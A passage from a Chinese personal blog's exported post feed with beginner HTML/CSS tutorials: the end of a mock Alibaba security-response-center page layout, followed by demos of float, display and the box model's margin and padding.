<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-index"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>7<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tops-last"</span>&gt;</span>10<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小笼包<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>一代宗师<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>68493<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main-bottom"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"about-us-title"</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>关于我们<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"about-alibaba"</span>&gt;</span></span><br><span class="line">					阿里巴巴集团一直致力于建设诚信、共赢、繁荣的电子商务产业生态圈。安全是其健康成长的核心要素，为此特成立集团安全部，隶属于其的安全响应中心（Alibaba Security Response Center，简称ASRC）欢迎广大用户向我们反馈阿里巴巴集团各事业部旗下相关产品及业务的安全漏洞和威胁情报，以帮助我们提升自身产品及业务的安全性，同时也希望借此平台加强与安全业界同仁的合作与交流。我们诚邀您共同为打造健康安全的电子商务产业生态圈贡献力量。</span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer-left"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contact-me"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">h3</span>&gt;</span>联系我们<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ab-email"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>邮箱：security@service.alibaba.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pgp"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>获取 PGP Public Key<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"src-ww"</span>&gt;</span>旺旺交流群：268149067y<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"src-qq"</span>&gt;</span>QQ交流群：40346338<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer-right"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contact-me"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">h3</span>&gt;</span>关注我们<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"first-new"</span>&gt;</span></span><br><span class="line">					第一时间了解线上线下活动资讯：</span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list-news"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-t"</span>&gt;</span>阿里安全响应中心微博<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-pic"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://gitee.com/gylq/cloudimages/raw/master/img/image-20210713044712542.png"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list-news"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-t"</span>&gt;</span>阿里安全响应中心微博<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-pic"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://gitee.com/gylq/cloudimages/raw/master/img/image-20210713044723128.png"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list-news"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-t"</span>&gt;</span>阿里安全响应中心微博<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-pic"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://gitee.com/gylq/cloudimages/raw/master/img/image-20210713044712542.png"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"border-bottom"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"xieyi"</span>&gt;</span></span><br><span class="line">				免责声明及隐私权政策 浙ICP备09002987号-11 © 2021阿里巴巴集团 版权所有</span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之float浮动块级元素行内元素</title>
    <url>/2021/07/09/%E3%80%90HTML%E3%80%91CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8Bfloat%E6%B5%AE%E5%8A%A8%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CSS基础学习之float浮动块级元素行内元素"><a href="#CSS基础学习之float浮动块级元素行内元素" class="headerlink" title="CSS基础学习之float浮动块级元素行内元素"></a>CSS基础学习之float浮动块级元素行内元素</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709114945420.png" alt="image-20210709114945420"></p>
<h2 id="demo8（margin设置代码）"><a href="#demo8（margin设置代码）" class="headerlink" title="demo8（margin设置代码）"></a>demo8（margin设置代码）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo8<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--float浮动 块级元素 行内元素--&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  		ul&#123;</span><br><span class="line">  			list-style: none;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="comment">/*浮动一般做导航*/</span></span></span><br><span class="line"><span class="css">  		<span class="selector-class">.nav-left</span>,<span class="selector-class">.nav-left</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">  			float: left;</span><br><span class="line">  			margin-left: 10px;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="selector-class">.nav-right</span>&#123;</span></span><br><span class="line">  			float: right;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="selector-class">.nav-right</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">  			float: left;</span><br><span class="line">  			margin-left: 10px;</span><br><span class="line">  		&#125;</span><br><span class="line"><span class="css">  		<span class="selector-tag">a</span>&#123;<span class="attribute">text-decoration</span>: none;&#125;</span></span><br><span class="line"><span class="css">  		<span class="comment">/*清楚浮动 clear*/</span></span></span><br><span class="line"></span><br><span class="line">  	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav-left"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>工具<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>更新<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav-right"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="demo9（行内元素和块级元素display）"><a href="#demo9（行内元素和块级元素display）" class="headerlink" title="demo9（行内元素和块级元素display）"></a>demo9（行内元素和块级元素display）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo9<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--float浮动 块级元素 行内元素--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    	<span class="selector-class">.demo9</span>,<span class="selector-class">.demo10</span>&#123;</span></span><br><span class="line">    		height: 100px;</span><br><span class="line">    		width: 100px;</span><br><span class="line">    		border: 1px solid red;</span><br><span class="line">    		display: inline;</span><br><span class="line">    	&#125;</span><br><span class="line">    	span&#123;</span><br><span class="line">    		border: 1px solid red;</span><br><span class="line">    		height: 100px;</span><br><span class="line">    		padding-left: 10px;</span><br><span class="line">    		display: inline-block;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo9"</span>&gt;</span></span><br><span class="line">		demo9</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo10"</span>&gt;</span></span><br><span class="line">		demo10</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--行内元素--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span>&gt;</span>span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>超级链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之盒子模型margin和padding的使用</title>
    <url>/2021/07/09/%E3%80%90HTML%E3%80%91CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8Bmargin%E5%92%8Cpadding%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CSS基础学习四盒子模型margin和padding的使用"><a href="#CSS基础学习四盒子模型margin和padding的使用" class="headerlink" title="CSS基础学习四盒子模型margin和padding的使用"></a>CSS基础学习四盒子模型margin和padding的使用</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709104702050.png" alt="image-20210709104702050"></p>
<h2 id="demo5（margin设置代码）"><a href="#demo5（margin设置代码）" class="headerlink" title="demo5（margin设置代码）"></a>demo5（margin设置代码）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo5<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--盒子模型、margin、padding学习--&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  	<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">  		margin-top: 20px;</span><br><span class="line">  		margin-left: 30px;</span><br><span class="line">  		margin-bottom: 50px;</span><br><span class="line">  		margin-right: 30px;  		</span><br><span class="line"><span class="css">  		<span class="comment">/*margin: 20px;*/</span>  </span></span><br><span class="line"><span class="css">  		<span class="comment">/*margin 外边距*/</span></span></span><br><span class="line">  	&#125;</span><br><span class="line"><span class="css">  	<span class="selector-class">.div1</span>,<span class="selector-class">.div2</span>,<span class="selector-class">.div3</span>&#123;</span></span><br><span class="line">  		width: 400px;</span><br><span class="line">  		height: 400px;</span><br><span class="line">  		background: red;</span><br><span class="line">  		border: 5px solid blue;</span><br><span class="line">  	&#125;</span><br><span class="line"><span class="css">  	<span class="selector-class">.div3</span>&#123;</span></span><br><span class="line"><span class="css">  		<span class="comment">/*margin: 10px 20px 30px 40px;*/</span> <span class="comment">/*上右下左*/</span></span></span><br><span class="line">  		margin: 0px auto;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div3"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="demo6（padding和margin差不多的设置代码）"><a href="#demo6（padding和margin差不多的设置代码）" class="headerlink" title="demo6（padding和margin差不多的设置代码）"></a>demo6（padding和margin差不多的设置代码）</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709104832921.png" alt="image-20210709104832921"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo6<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--盒子模型、margin、padding学习--&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  		<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">  			width: 400px;</span><br><span class="line">  			height: 400px;</span><br><span class="line">  			background: red;</span><br><span class="line"><span class="css">  			<span class="comment">/*用法和margin差不多*/</span></span></span><br><span class="line">  			padding: 10px 20px 30px 40px;</span><br><span class="line">  		&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">		demo5</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span 